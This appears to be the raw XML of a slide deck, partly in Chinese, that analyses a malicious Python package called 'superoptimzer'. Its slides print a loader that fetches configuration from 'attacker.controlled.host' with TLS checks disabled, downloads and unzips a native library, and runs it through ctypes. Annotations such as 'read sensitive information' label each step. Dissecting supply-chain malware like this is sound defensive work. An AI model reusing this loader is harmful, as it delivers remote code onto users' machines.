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F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507"/>
    <p:restoredTop sz="85680"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="53" d="100"/>
          <a:sy n="53" d="100"/>
        </p:scale>
        <p:origin x="2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0A27C-FE9B-654D-85A4-98F92A04DAB2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EC31D-4B10-7D49-BF54-2E2C371A60E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4583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下载 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>目录，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8EC31D-4B10-7D49-BF54-2E2C371A60ED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7033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85A8F-6036-499E-66E0-D48E53FEF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FA3FB7-42C4-61DA-FD3F-7E7277948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FF7CFB-60EB-7716-D565-94445F1D2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6A2C17-348C-214E-7939-8818126D1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671D81-B51D-BAC5-ED40-6F3EC5577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479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B230B-BFE9-8E62-903F-3E74A4154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EE4A3D-C392-4868-C286-34D626178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02BF7B-B180-9736-4998-B0264FA1B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CB4E6C-F3FC-6FE4-5CE3-332F4655D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F9464A-4F93-49D0-A1AC-7ADEABF0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3687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70961C-D35F-0D9F-7335-3117CEB3F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E74DF1-4514-FFB3-9B8F-6549D3A7E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A22E86-2F32-84DC-D148-88D9BF06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E98E28-F491-E077-F853-AC001488E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9A8EFA-958C-F8A9-91CF-1C0F736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7094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BE5F2-20FA-6E76-9CBA-47F9F2373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E9432E-47D0-1F7A-A21B-A0BCB6C01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DC22D6-7F59-672D-681C-A44DD2638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DD431C-8FD7-79D7-3F2F-BCF1256E7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83D8D5-1B56-5E4D-7855-A3C54679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28099F-02E4-389B-0C81-B794D4075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888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4E4019-C830-859B-1636-20DED5739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7E5502-1975-B446-C8AE-5C6F9955E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787B97-9801-2E39-53D4-454793FAD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19AAC8-E342-29BC-46AD-20C6C26C7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C8A2C8B-6113-C668-AFF4-B9EE18A16F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87EF65-D8D7-FB6A-9ED3-67D1BD179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43309D8-0DDE-88F4-80BD-179A0F5C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98EFC0-324C-2225-8FFE-4A32F7E3A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122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E8D53-A398-2CE6-79C2-F8F1C83AA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FC76EB-7F8B-AE2A-9095-EC3D99F42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251E04-31F1-3673-D7FC-98D5FB06F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AF7CAE-EE03-8482-6F52-C264CED1F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2042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FF9DF2-7982-683A-D080-66096FAF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41BA92-E931-36A7-FEA9-B555FD85B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AFEA54-9600-86CA-0721-54992FFD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872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B29E4-EF9B-73F8-3FBD-694A3DDF3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14FEF3-1592-B4E5-FA26-999C054F9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5E987E-4F0C-3D4A-39DF-42B571D62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2E71E6-3CE6-6881-BA45-1B26E4268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47FE51-F0B3-9F49-B2DA-08D23D27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5B2A09-3E7C-FEED-13C3-B8DE2DC9F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817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560A15-C2EA-2866-D935-B182C1534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2859E9-BD9D-FD9A-F399-0D53D5D6C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3E2F26-86C4-5D23-52F7-EF23965A1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6B0465-5450-F084-A952-CDDEEC69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CFC89F-DF6F-932E-44AC-5D4E09783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DB96FF-ACD1-EB63-B1CE-65388C7A5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7414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8C5C0-C50A-8F3B-7A06-D0C39A324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DA814B-5C2D-4224-804C-55905D846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B6ED36-7FD7-95F2-F998-EBD021AC7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C7E325-513A-768D-96AE-7870E318B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D9977E-A455-F4A0-1F2A-AEDD8EA08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1669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736346-A171-7660-DFBF-2C9C80F718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B220543-B313-C98A-9CBF-302FDE1E4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3BCAC8-8862-6BF2-23E3-B2F6C8757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6650DD-0485-DBC8-799D-25C3E64D3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805303-9FED-D42F-FB89-8AF726C01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2896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923DC9-AB6E-7C26-B283-D70BFD8BF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753F39-A253-04E9-971F-8D5B9D48E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B465AA-3F22-CE30-7F3D-4234330DD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74B21-E513-2745-970B-E8B28C44A173}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:t>2023/6/6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B1621F-2555-893A-9F0C-7B3FC9B97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658B6B-7891-B73C-3053-D47136611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76B82-2EE3-3E43-90E8-41051DE78E6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20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169FF54-CA49-021C-1417-809AA89C2A66}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5848316" y="324597"/>
            <a:ext cx="6280184" cy="544764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def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load_config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():</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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import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ssl</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="6F42C1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zh-CN" altLang="en-US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from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urllib.request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0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import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urlopen</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="6F42C1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url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	</a:t>
            </a:r>
          </a:p>
          <a:p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	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"https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="032F62"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>attacker.controlled.host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/attacker/</a:t>
            </a:r>
          </a:p>
          <a:p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	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0" err="1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malicious_repo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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0" err="1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payload.jpg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"</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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ssl_context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ssl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.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create_default_context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()</a:t>
            </a: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ssl_context.check_hostname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005CC5"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>False</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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ssl_context.verify_mode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ssl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.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="005CC5"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CERT_NONE</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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response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urlopen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url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, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E36209"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>context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ssl_context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)</a:t>
            </a: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data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json.loads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response.read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())</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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return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data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="D73A49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def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get_arch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() -&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0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str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:</a:t>
            </a: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arch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platform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.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machine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().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0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lower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()</a:t>
            </a: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if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arch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"x86_64"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or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arch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"x64"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:</a:t>
            </a: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   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return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"amd64"</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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if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arch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"aarch64"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:</a:t>
            </a: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   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return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"arm64"</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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   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return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arch</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="D73A49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endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="D73A49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def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get_os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() -&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0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str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:</a:t>
            </a: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if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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1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darwin</a:t>
            </a:r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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0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-US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==</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0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-US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platform.system</a:t>
            </a:r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()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0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.lower</a:t>
            </a:r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():</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0"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        return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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0" err="1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darwin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"</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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if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-US" altLang="zh-CN" sz="1200" dirty="0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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0" err="1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linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0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" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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== </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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platform.system</a:t>
            </a:r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()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0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.lower</a:t>
            </a:r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():</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0"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        return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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0" err="1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linux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"</a:t>
            </a:r>
          </a:p>
          <a:p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    if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-US" altLang="zh-CN" sz="1200" dirty="0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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0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" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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== </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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platform.system</a:t>
            </a:r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()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0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.lower</a:t>
            </a:r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():</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0"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        return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"windows"</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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pPr lvl="1"/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raise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ValueError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"Unable to determine local operating system"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8658BF-E92A-1A8A-2BEB-18CBFCFC48F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5573965" y="317856"/>
            <a:ext cx="6591606" cy="554954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14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0C2B68-CF34-A67D-3907-E48A3F1C4F63}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5536895" y="326428"/>
            <a:ext cx="43285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3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4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
              <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0"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5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6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7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8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9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10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11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12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13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14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15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16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17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18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19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20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21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22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23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24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25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26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27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5B7B011-B1E0-C309-577B-368999675601}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5573965" y="5864093"/>
            <a:ext cx="65802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pf.py</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="e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kumimoji="1" lang="en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superoptimzer-1.0.0</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN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B9686A77-554D-853C-3B73-FED54CB4A65E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="37805" y="317689"/>
            <a:ext cx="5400335" cy="554971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141"/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8517067D-41DC-C8CF-F064-BFE1354A4D0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-4728" y="304993"/>
            <a:ext cx="37061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3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4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5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6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7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8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9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10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11</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0"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12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13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14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15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16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17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18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19</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0"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20</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0"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21</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0"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22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23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24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25</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>26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C9477E-C52C-2FF4-DB7F-E75AD8218867}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="35156" y="5885252"/>
            <a:ext cx="5400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debug.py</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="e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kumimoji="1" lang="en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superoptimzer-1.0.0</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" alt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155BDBA-091E-8A97-C8C4-D03D5D0ABE75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="271130" y="306915"/>
            <a:ext cx="5206338" cy="58169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import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os</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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from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pf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import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*</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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def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download_and_unzip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dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E36209"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tfile_url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, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E36209"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tdir_path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):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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from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urllib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.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request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import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urlopen</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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pPr lvl="1"/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from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io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import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BytesIO</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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pPr lvl="1"/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from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zipfile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import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ZipFile</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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pPr lvl="1"/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import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ssl</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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pPr lvl="1"/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ssl_context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ssl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.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create_default_context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ssl_context.check_hostname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005CC5"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>False</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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pPr lvl="1"/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ssl_context.verify_mode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ssl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.CERT_NONE</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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pPr lvl="1"/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http_response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urlopen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dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E36209"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tfile_url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,  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E36209"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>context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ssl_context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zipfile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ZipFile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BytesIO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http_response.read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()))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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zipfile.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extractall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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E36209"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>path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 err="1">
                <a:solidFill>
                  <a:srgbClr val="E36209"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tdir_path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)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E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def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start_sub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():</a:t>
            </a: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config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b="1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load_config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="1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()</a:t>
            </a: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version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config[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'upgrade'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][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'optimizer'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]</a:t>
            </a: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tdir_path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target_dir_path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(version)</a:t>
            </a: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tfile_path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6F42C1"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>os.path.join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tdir_path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, 	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get_share_name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())</a:t>
            </a:r>
            <a:b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</a:br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if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not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existing_lib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tfile_path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)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or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not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-US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	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legal_file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tfile_path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):</a:t>
            </a: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    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tfile_url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config[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'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0" err="1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library_location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'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]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+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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E"/>
              </a:solidFill>
              <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRP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    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config[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'optimizer'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][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f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'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005CC5"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="1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get_os</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="1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()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005CC5"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}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_</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005CC5"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="1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get_arch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="1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()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005CC5"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="032F62"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>’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]</a:t>
            </a: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    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="1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download_and_unzip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tfile_url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, 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tdir_path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)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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if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existing_lib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tfile_path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):</a:t>
            </a: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-US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lib </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=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ctypes.cdll.LoadLibrary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tfile_path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)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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-US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    </a:t>
            </a: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lib.optimize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()</a:t>
            </a:r>
            <a:b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</a:br>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0" err="1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start_sub</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="24292E"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2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F67B7BF-4F8C-1F10-7E28-2796016B4A4E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6290580" y="919399"/>
            <a:ext cx="4717721" cy="531922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1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739073D-3159-3D38-C191-E5114379C5DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6290581" y="2016713"/>
            <a:ext cx="4195785" cy="192617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1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22C1070-AEB4-6553-350B-3E9FB9DC2290}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6290581" y="2921932"/>
            <a:ext cx="3097019" cy="192679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1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33B82EDA-7DF9-84A5-7A51-07CE35C98D93}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6290580" y="4402001"/>
            <a:ext cx="3827563" cy="192617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1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8E4966B-E96A-7FD2-7827-7644C3A4B438}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9463745" y="11035587"/>
            <a:ext cx="1682979" cy="267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41" dirty="0"/>
              <a:t>uses network call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7054D2E-BECC-BD71-51B0-21C9483F905F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9793955" y="436035"/>
            <a:ext cx="1565478" cy="393344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halkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>use URL</a:t>
            </a:r>
            <a:endParaRPr lang="en-CN" sz="1200" dirty="0">
              <a:latin typeface="Chalkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
            </a:endParaRP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0AE5E553-EAF3-64BC-B87B-8BF36C742B1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="6" idx="3"/>
            <a:endCxn id="10" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="11008301" y="632707"/>
            <a:ext cx="351132" cy="552653"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val -65104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3B9D5001-B230-D677-BF56-4DD8BC47B1D8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5890471" y="2040266"/>
            <a:ext cx="411060" cy="125720"/>
          </a:xfrm>
          <a:prstGeom prst="curved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B883D20C-3C55-1C79-73D6-0711290CAF99}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9698100" y="3594490"/>
            <a:ext cx="2097137" cy="393344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halkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>read sensitive information</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p: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BC9E6A74-72D0-5B6B-1E40-1985D3E449AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="45" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="10155082" y="3950895"/>
            <a:ext cx="554649" cy="628526"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector2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A583E619-2577-16AF-5D67-F1FAAA0A66CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="45" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="16200000" flipV="1">
            <a:off x="9789812" y="2637632"/>
            <a:ext cx="554646" cy="1359069"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector2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圆角矩形 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9ACA9ACE-999E-213E-D249-97B9A3F82906}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="765686" y="2209330"/>
            <a:ext cx="3283956" cy="349534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1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69F38B4-29EF-E8C6-1952-68D5F012C01B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
